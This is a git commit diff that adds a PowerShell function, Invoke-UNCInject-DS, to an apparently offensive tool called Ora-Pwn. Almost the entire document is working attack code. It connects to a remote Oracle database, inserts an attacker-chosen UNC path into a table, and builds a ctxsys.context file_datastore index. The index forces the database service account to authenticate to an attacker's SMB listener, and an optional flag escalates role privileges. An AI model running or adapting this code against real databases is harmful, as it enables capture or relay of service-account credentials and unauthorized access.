327db300d7ff9788a2ba6b9c6caf7211b282b0a3
Andrew <ch33kyf3ll0w@users.noreply.github.com>
2015-11-30 21:50:46 -0600

    Update Ora-Pwn.ps1

--- Ora-Pwn.ps1
+++ Ora-Pwn.ps1
@@ -310,3 +310,109 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 	}
 $conn.Close()
 }
+function Invoke-UNCInject-DS {
+
+<#
+.DESCRIPTION
+Leverages the creation of indexes by ctxsys.context to force the underlying user account running the  
+
+.PARAMETER HostName
+Host of the remote TNS Listener.
+
+.PARAMETER HostPort
+Port of the remote TNS Listener.
+
+.PARAMETER SID
+SID of the remote TNS Listener.
+
+.PARAMETER Username
+Username to authenticate against the remote Oracle DB.
+
+.PARAMETER Password
+Password to authenticate agains the remote Oracle DB.
+
+.PARAMETER UNCPath
+The UNC file path to be injected into the datastore.
+
+.PARAMETER AddPrivs
+This will trigger the creation of a new role, grant this role to the provided username, and then leverage the Oracle Text API to grant file_roles permissions to the newly created role.
+
+.EXAMPLE
+PS C:\> Invoke-UNCInject-DS  -Host 192.168.1.34 -Port 1521 -Sid EPROD -User SCOTT -Password TIGER -UNCPath \\192.168.1.2\supersecretfile
+
+.EXAMPLE
+PS C:\> Invoke-UNCInject-DS  -Host 192.168.1.34 -Port 1521 -Sid EPROD -User SCOTT -Password TIGER -UNCPath \\192.168.1.2\supersecretfile -AddPrivs True
+
+.LINKS
+https://msdn.microsoft.com/en-us/library/system.data.oracleclient(v=vs.110).aspx
+https://technet.microsoft.com/en-us/library/hh849914.aspx
+http://erpscan.com/press-center/blog/smbrelay-bible-3-smbrelay-by-oracle/
+http://www.asjava.com/oracle/oracle-error-drg-10758-index-owner-does-not-have-the-privilege-to-use-file-or-url-datastore/#respond
+http://dbatricksworld.com/ora-65096-invalid-common-user-or-role-name-and-ora-65049-creation-of-local-user-or-role-is-not-allowed-in-cdbroot/
+#>
+
+	#Assigning Args
+	[CmdletBinding()]
+    		param(
+        [Parameter(Mandatory = $True)]
+        [string]$HostName,
+        [Parameter(Mandatory = $True)]
+        [string]$HostPort,
+        [Parameter(Mandatory = $True)]
+        [string]$SID,
+        [Parameter(Mandatory = $True)]
+        [string]$Username,
+        [Parameter(Mandatory = $True)]
+        [string]$Password,
+	[Parameter(Mandatory = $True)]
+        [string]$UNCPath,
+	[Parameter(Mandatory = $false)]
+        [string]$AddPrivs
+    	)
+		
+	#Loads .NET OracleClient Assembly
+	Add-Type -AssemblyName System.Data.OracleClient
+	
+	#Generate random string
+	$randStr1 = ([char[]]([char]'a'..[char]'z' + [char]'A'..[char]'Z') | sort {get-random})[0..12] -join ''
+	$randStr2 = ([char[]]([char]'a'..[char]'z' + [char]'A'..[char]'Z') | sort {get-random})[0..12] -join ''
+	
+	#Create connection string
+	$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$Username;Password=$Password"
+	
+	if ($AddPrivs -eq "true" -or $AddPrivs -eq "True"){
+		#Adds in functionality to add file_role privileges to the specified user. This is needed for some Oracle 12c instances.
+		$queryArray = @("CREATE ROLE C##DATASTORE_ROLE","GRANT C##DATASTORE_ROLE to $Username", "EXEC ctxsys.ctx_adm.set_parameter('file_access_role', 'C##DATASTORE_ROLE')","CREATE TABLE $randStr1 (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE, col_format VARCHAR(6))", "INSERT INTO $randStr1 VALUES (1, '$UNCPath', NULL)", "CREATE INDEX $randStr2 ON $randStr1(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column col_format')")
+	}
+	else{
+		#If $AddPrivs is NULL set just the needed query's for UNC injection.
+		$queryArray = @("CREATE TABLE $randStr1 (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE, col_format VARCHAR(6))", "INSERT INTO $randStr1 VALUES (1, '$UNCPath', NULL)", "CREATE INDEX $randStr2 ON $randStr1(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column col_format')")
+	}
+	
+	#Initiate connection to DB
+	$conn = new-object System.Data.OracleClient.OracleConnection($connectionString)
+
+	
+	try {
+		foreach ($u in $queryArray){
+			Write-Host "`nINFO: Now attempting to execute provided query......`n" $u
+			$command = new-Object System.Data.OracleClient.OracleCommand($u, $conn)
+			#Open connection to DB
+			$conn.Open()
+			$reader = $command.ExecuteReader()
+			$conn.Close()
+		}
+		Write-Host -Object "`n[+] Success! Please check your SMB listener for the results.`n" -ForegroundColor 'green' 
+	}
+	catch {
+		#Assigns exception message to var
+		$ErrorMessage = $_.Exception.Message
+		if ($ErrorMessage -like "*DRG-10758*"){
+			Write-Host -Object "Please re-run Invoke-UNCInject-DS with the -AddPrivs flag set to true. This flag will require a privileged Oracle database user." -ForegroundColor 'red'
+		}
+		else{
+			Write-Host  -Object "`n[*] Query execution Failed. Error: $ErrorMessage" -ForegroundColor 'red'
+		}
+	}
+
+}
